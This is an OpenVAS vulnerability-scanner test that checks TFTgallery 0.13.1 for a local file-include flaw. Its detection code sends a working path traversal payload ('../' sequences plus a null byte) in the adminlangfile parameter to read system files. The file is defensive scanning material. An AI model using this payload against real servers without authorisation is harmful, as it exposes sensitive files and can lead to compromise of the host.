###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tftgallery_44523.nasl 8447 2018-01-17 16:12:19Z teissa $
#
# TFTgallery 'thumbnailformpost.inc.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "TFTgallery is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

TFTgallery 0.13.1 is vulnerable; other versions may also be affected.";

tag_solution = "Updates are available to address this issue. Please see the references
for more information.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100879");
 script_version("$Revision: 8447 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-17 17:12:19 +0100 (Wed, 17 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-10-29 12:58:08 +0200 (Fri, 29 Oct 2010)");
 script_bugtraq_id(44523);

 script_name("TFTgallery 'thumbnailformpost.inc.php' Local File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44523");
 script_xref(name : "URL" , value : "http://tftgallery.sourceforge.net/");
 script_xref(name : "URL" , value : "http://www.tftgallery.org/versions/tftgallery-0.13-to-0.13.1.zip");

 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("tftgallery_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"tftgallery"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/admin/thumbnailformpost.inc.php?adminlangfile=",crap(data:"../",length:3*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url, pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}
exit(0);

